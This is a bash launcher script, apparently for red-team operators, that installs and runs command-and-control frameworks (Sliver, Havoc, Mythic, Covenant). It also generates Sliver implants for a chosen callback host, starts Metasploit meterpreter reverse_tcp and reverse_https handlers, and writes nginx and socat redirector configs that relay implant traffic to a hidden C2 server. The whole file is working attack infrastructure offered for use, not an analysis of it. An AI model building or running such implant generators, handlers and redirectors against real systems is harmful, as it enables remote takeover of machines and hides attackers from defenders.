#!/usr/bin/env bash
# ==============================================================================
# C2-RUN — Multi-C2 Framework Launcher (Sliver, Havoc, Mythic, Brute Ratel)
# ==============================================================================
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/lib/common.sh" 2>/dev/null || true

# Colors fallback
: "${RED:=\033[0;31m}"; : "${GREEN:=\033[0;32m}"; : "${YELLOW:=\033[1;33m}"
: "${BLUE:=\033[0;34m}"; : "${MAGENTA:=\033[0;35m}"; : "${CYAN:=\033[0;36m}"
: "${BOLD:=\033[1m}"; : "${NC:=\033[0m}"

# Paths
SLIVER_DIR="${SLIVER_DIR:-$HOME/sliver}"
HAVOC_DIR="${HAVOC_DIR:-$HOME/havoc}"
MYTHIC_DIR="${MYTHIC_DIR:-$HOME/mythic}"
C2_PROFILES_DIR="${C2_PROFILES_DIR:-$SCRIPT_DIR/c2-profiles}"

show_banner() {
    echo -e "${RED}${BOLD}"
    echo "  ╔══════════════════════════════════════════════════════════════╗"
    echo "  ║       C2-RUN — Multi C2 Framework Launcher                  ║"
    echo "  ║       Sliver • Havoc • Mythic • Brute Ratel                 ║"
    echo "  ╚══════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

check_docker() {
    command -v docker &>/dev/null && docker info &>/dev/null 2>&1
}

check_go() {
    command -v go &>/dev/null
}

# ── SLIVER ────────────────────────────────────────────────────────────────────
install_sliver() {
    step "Installing Sliver C2"
    
    if [[ -f "$HOME/sliver-server" ]] || [[ -f "$HOME/sliver-client" ]]; then
        log "Sliver already installed"
        return 0
    fi
    
    if ! check_go; then
        warn "Go not installed. Run setup.sh --deps first"
        return 1
    fi
    
    info "Building Sliver from source..."
    cd /tmp
    git clone https://github.com/BishopFox/sliver.git 2>/dev/null || true
    cd sliver
    make 2>&1 | tail -20
    cp sliver-server sliver-client "$HOME/"
    log "Sliver installed to ~/sliver-server and ~/sliver-client"
}

start_sliver_server() {
    local lhost="${1:-0.0.0.0}"
    local lport="${2:-31337}"
    
    [[ -f "$HOME/sliver-server" ]] || { err "Sliver not installed. Run: bash c2-run.sh install sliver"; return 1; }
    
    info "Starting Sliver server on $lhost:$lport"
    "$HOME/sliver-server" --laddr "$lhost" --lport "$lport" &
    local pid=$!
    echo $pid > /tmp/sliver-server.pid
    log "Sliver server started (PID: $pid)"
    info "Connect client: sliver-client --host $lhost --port $lport"
}

start_sliver_client() {
    local host="${1:-localhost}"
    local port="${2:-31337}"
    
    [[ -f "$HOME/sliver-client" ]] || { err "Sliver client not found"; return 1; }
    
    info "Connecting to Sliver server at $host:$port"
    "$HOME/sliver-client" --host "$host" --port "$port"
}

generate_sliver_implant() {
    local lhost="${1:-}"
    local lport="${2:-31337}"
    local fmt="${3:-exe}"
    
    [[ -z "$lhost" ]] && read -r -p "LHOST: " lhost
    [[ -z "$lhost" ]] && { err "LHOST required"; return 1; }
    
    [[ -f "$HOME/sliver-server" ]] || { err "Sliver not installed"; return 1; }
    
    info "Generating Sliver implant: $fmt -> $lhost:$lport"
    "$HOME/sliver-client" generate --format "$fmt" --host "$lhost" --port "$lport" --save "/tmp/sliver-implant.$fmt"
    log "Implant saved: /tmp/sliver-implant.$fmt"
}

# ── HAVOC ─────────────────────────────────────────────────────────────────────
install_havoc() {
    step "Installing Havoc C2"
    
    if [[ -d "$HAVOC_DIR" ]]; then
        log "Havoc directory exists"
        return 0
    fi
    
    if ! check_docker; then
        warn "Docker required for Havoc. Install docker first."
        return 1
    fi
    
    info "Cloning Havoc..."
    git clone https://github.com/HavocFramework/Havoc.git "$HAVOC_DIR" 2>/dev/null || true
    cd "$HAVOC_DIR"
    log "Havoc cloned to $HAVOC_DIR"
    info "Build: cd $HAVOC_DIR && docker compose build"
    info "Run: cd $HAVOC_DIR && docker compose up -d"
}

start_havoc() {
    [[ -d "$HAVOC_DIR" ]] || { err "Havoc not installed. Run: bash c2-run.sh install havoc"; return 1; }
    check_docker || { err "Docker not running"; return 1; }
    
    info "Starting Havoc via Docker Compose..."
    cd "$HAVOC_DIR"
    docker compose up -d
    log "Havoc started. Web UI: https://localhost:443 (default admin:password)"
    info "Change default password immediately!"
}

# ── MYTHIC ────────────────────────────────────────────────────────────────────
install_mythic() {
    step "Installing Mythic C2"
    
    if [[ -d "$MYTHIC_DIR" ]]; then
        log "Mythic directory exists"
        return 0
    fi
    
    if ! check_docker; then
        warn "Docker required for Mythic"
        return 1
    fi
    
    info "Cloning Mythic..."
    git clone https://github.com/its-a-feature/Mythic.git "$MYTHIC_DIR" 2>/dev/null || true
    cd "$MYTHIC_DIR"
    log "Mythic cloned to $MYTHIC_DIR"
    info "Install: sudo ./mythic-cli install"
    info "Start: sudo ./mythic-cli start"
}

start_mythic() {
    [[ -d "$MYTHIC_DIR" ]] || { err "Mythic not installed. Run: bash c2-run.sh install mythic"; return 1; }
    check_docker || { err "Docker not running"; return 1; }
    
    info "Starting Mythic..."
    cd "$MYTHIC_DIR"
    sudo ./mythic-cli start
    log "Mythic started. Web UI: http://localhost:7443"
}

# ── COVENANT (DotNet) ─────────────────────────────────────────────────────────
install_covenant() {
    step "Installing Covenant C2"
    
    local cov_dir="$HOME/Covenant"
    if [[ -d "$cov_dir" ]]; then
        log "Covenant exists"
        return 0
    fi
    
    if ! command -v dotnet &>/dev/null; then
        warn "DotNet SDK required. Install from https://dotnet.microsoft.com"
        return 1
    fi
    
    git clone --recurse-submodules https://github.com/cobbr/Covenant "$cov_dir"
    cd "$cov_dir/Covenant"
    dotnet build
    log "Covenant built. Run: dotnet run --project $cov_dir/Covenant/Covenant.csproj"
}

# ── METASPLOIT C2 (Meterpreter) ───────────────────────────────────────────────
start_msf_handler() {
    local payload="${1:-windows/x64/meterpreter/reverse_tcp}"
    local lhost="${2:-}"
    local lport="${3:-4444}"
    
    [[ -z "$lhost" ]] && read -r -p "LHOST: " lhost
    [[ -z "$lhost" ]] && { err "LHOST required"; return 1; }
    
    info "Starting MSF handler for $payload"
    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD $payload; set LHOST $lhost; set LPORT $lport; exploit -j"
}

# ── PROXY/REDIRECTORS ─────────────────────────────────────────────────────────
setup_nginx_redirector() {
    local c2_host="${1:-}"
    local c2_port="${2:-443}"
    local listen_port="${3:-8443}"
    
    [[ -z "$c2_host" ]] && { err "C2 host required"; return 1; }
    
    cat > /tmp/c2-redirector.conf << NGINX
events { worker_connections 1024; }
http {
    server {
        listen $listen_port ssl;
        ssl_certificate /etc/ssl/certs/ssl-cert-snakeoil.pem;
        ssl_certificate_key /etc/ssl/private/ssl-cert-snakeoil.key;
        
        location / {
            proxy_pass https://$c2_host:$c2_port;
            proxy_set_header Host \$host;
            proxy_set_header X-Real-IP \$remote_addr;
            proxy_ssl_verify off;
        }
    }
}
NGINX
    log "Nginx config: /tmp/c2-redirector.conf"
    info "Run: docker run -d -p $listen_port:$listen_port -v /tmp/c2-redirector.conf:/etc/nginx/nginx.conf:ro nginx"
}

setup_socat_redirector() {
    local listen_port="${1:-443}"
    local target_host="${2:-}"
    local target_port="${3:-443}"
    
    [[ -z "$target_host" ]] && { err "Target host required"; return 1; }
    
    info "Starting socat redirector: $listen_port -> $target_host:$target_port"
    socat "TCP-LISTEN:$listen_port,fork,reuseaddr" "TCP:$target_host:$target_port" &
    echo $! > /tmp/socat-redirector.pid
    log "Socat redirector started (PID: $!)"
}

# ── MENU ──────────────────────────────────────────────────────────────────────
show_menu() {
    echo -e "${BOLD}Select C2 Framework:${NC}"
    echo ""
    echo -e "  ${GREEN}1)${NC} 🦊 ${BOLD}Sliver${NC}          — Modern, Go-based, cross-platform"
    echo -e "  ${GREEN}2)${NC} ☠️  ${BOLD}Havoc${NC}           — Docker-based, modern UI"
    echo -e "  ${GREEN}3)${NC} 🏛️  ${BOLD}Mythic${NC}          — Modular, plugin-based, Docker"
    echo -e "  ${GREEN}4)${NC} ✝️  ${BOLD}Covenant${NC}        — .NET, collaborative"
    echo -e "  ${GREEN}5)${NC} 🎯 ${BOLD}Metasploit Handler${NC} — Built-in meterpreter"
    echo -e "  ${GREEN}6)${NC} 🔀 ${BOLD}Redirectors${NC}     — Nginx/Socat proxy setup"
    echo -e "  ${GREEN}0)${NC} Exit"
    echo ""
}

sliver_menu() {
    echo -e "${BOLD}Sliver Options:${NC}"
    echo -e "  ${GREEN}1)${NC} Install Sliver"
    echo -e "  ${GREEN}2)${NC} Start Server"
    echo -e "  ${GREEN}3)${NC} Start Client"
    echo -e "  ${GREEN}4)${NC} Generate Implant"
    echo -e "  ${GREEN}0)${NC} Back"
    echo ""
    read -r -p "  [?] Choice: " c
    case "$c" in
        1) install_sliver ;;
        2) read -r -p "LHOST [0.0.0.0]: " lh; read -r -p "LPORT [31337]: " lp; start_sliver_server "${lh:-0.0.0.0}" "${lp:-31337}" ;;
        3) read -r -p "Server host [localhost]: " h; read -r -p "Port [31337]: " p; start_sliver_client "${h:-localhost}" "${p:-31337}" ;;
        4) read -r -p "LHOST: " lh; read -r -p "LPORT [31337]: " lp; read -r -p "Format (exe/elf/macho) [exe]: " f; generate_sliver_implant "$lh" "${lp:-31337}" "${f:-exe}" ;;
    esac
}

havoc_menu() {
    echo -e "${BOLD}Havoc Options:${NC}"
    echo -e "  ${GREEN}1)${NC} Install Havoc"
    echo -e "  ${GREEN}2)${NC} Start Havoc"
    echo -e "  ${GREEN}0)${NC} Back"
    read -r -p "  [?] Choice: " c
    case "$c" in 1) install_havoc ;; 2) start_havoc ;; esac
}

mythic_menu() {
    echo -e "${BOLD}Mythic Options:${NC}"
    echo -e "  ${GREEN}1)${NC} Install Mythic"
    echo -e "  ${GREEN}2)${NC} Start Mythic"
    echo -e "  ${GREEN}0)${NC} Back"
    read -r -p "  [?] Choice: " c
    case "$c" in 1) install_mythic ;; 2) start_mythic ;; esac
}

covenant_menu() {
    echo -e "${BOLD}Covenant Options:${NC}"
    echo -e "  ${GREEN}1)${NC} Install Covenant"
    echo -e "  ${GREEN}0)${NC} Back"
    read -r -p "  [?] Choice: " c
    case "$c" in 1) install_covenant ;; esac
}

msf_menu() {
    echo -e "${BOLD}Metasploit Handler:${NC}"
    echo -e "  ${GREEN}1)${NC} Start Reverse TCP Handler"
    echo -e "  ${GREEN}2)${NC} Start HTTPS Handler"
    echo -e "  ${GREEN}0)${NC} Back"
    read -r -p "  [?] Choice: " c
    case "$c" in
        1) read -r -p "LHOST: " lh; read -r -p "LPORT [4444]: " lp; start_msf_handler "windows/x64/meterpreter/reverse_tcp" "$lh" "${lp:-4444}" ;;
        2) read -r -p "LHOST: " lh; read -r -p "LPORT [443]: " lp; start_msf_handler "windows/x64/meterpreter/reverse_https" "$lh" "${lp:-443}" ;;
    esac
}

redirector_menu() {
    echo -e "${BOLD}Redirector Setup:${NC}"
    echo -e "  ${GREEN}1)${NC} Nginx HTTPS Redirector"
    echo -e "  ${GREEN}2)${NC} Socat TCP Redirector"
    echo -e "  ${GREEN}0)${NC} Back"
    read -r -p "  [?] Choice: " c
    case "$c" in
        1) read -r -p "C2 Host: " ch; read -r -p "C2 Port [443]: " cp; read -r -p "Listen Port [8443]: " lp; setup_nginx_redirector "$ch" "${cp:-443}" "${lp:-8443}" ;;
        2) read -r -p "Listen Port [443]: " lp; read -r -p "Target Host: " th; read -r -p "Target Port [443]: " tp; setup_socat_redirector "${lp:-443}" "$th" "${tp:-443}" ;;
    esac
}

main() {
    case "${1:-}" in
        --help|-h)
            cat << HELP
C2-RUN — Multi C2 Framework Launcher

Usage: bash c2-run.sh [COMMAND] [ARGS...]

Commands:
  install sliver|havoc|mythic|covenant  Install C2 framework
  sliver [server|client|implant]       Sliver operations
  havoc [start]                        Havoc operations
  mythic [start]                       Mythic operations
  msf [tcp|https]                      Metasploit handler
  redirector [nginx|socat]             Proxy redirector setup
  menu                                 Interactive menu (default)

Examples:
  bash c2-run.sh install sliver
  bash c2-run.sh sliver server
  bash c2-run.sh sliver implant 192.168.1.100 31337 exe
  bash c2-run.sh msf https 192.168.1.100 443
  bash c2-run.sh menu
HELP
            ;;
        install)
            case "${2:-}" in
                sliver) install_sliver ;;
                havoc) install_havoc ;;
                mythic) install_mythic ;;
                covenant) install_covenant ;;
                *) err "Unknown: $2. Use sliver|havoc|mythic|covenant" ;;
            esac
            ;;
        sliver)
            case "${2:-}" in
                server) start_sliver_server "${3:-0.0.0.0}" "${4:-31337}" ;;
                client) start_sliver_client "${3:-localhost}" "${4:-31337}" ;;
                implant) generate_sliver_implant "${3:-}" "${4:-31337}" "${5:-exe}" ;;
                *) sliver_menu ;;
            esac
            ;;
        havoc)
            case "${2:-}" in start) start_havoc ;; *) havoc_menu ;; esac
            ;;
        mythic)
            case "${2:-}" in start) start_mythic ;; *) mythic_menu ;; esac
            ;;
        covenant)
            case "${2:-}" in *) covenant_menu ;; esac
            ;;
        msf)
            case "${2:-}" in
                tcp) start_msf_handler "windows/x64/meterpreter/reverse_tcp" "${3:-}" "${4:-4444}" ;;
                https) start_msf_handler "windows/x64/meterpreter/reverse_https" "${3:-}" "${4:-443}" ;;
                *) msf_menu ;;
            esac
            ;;
        redirector)
            case "${2:-}" in
                nginx) setup_nginx_redirector "${3:-}" "${4:-443}" "${5:-8443}" ;;
                socat) setup_socat_redirector "${3:-443}" "${4:-}" "${5:-443}" ;;
                *) redirector_menu ;;
            esac
            ;;
        menu|"")
            show_banner
            show_menu
            read -r -p "  [?] Choice: " choice
            case "$choice" in
                1) sliver_menu ;;
                2) havoc_menu ;;
                3) mythic_menu ;;
                4) covenant_menu ;;
                5) msf_menu ;;
                6) redirector_menu ;;
                0) exit 0 ;;
                *) warn "Invalid" ;;
            esac
            ;;
        *) err "Unknown: $1. Use --help"; exit 1 ;;
    esac
}

main "$@"
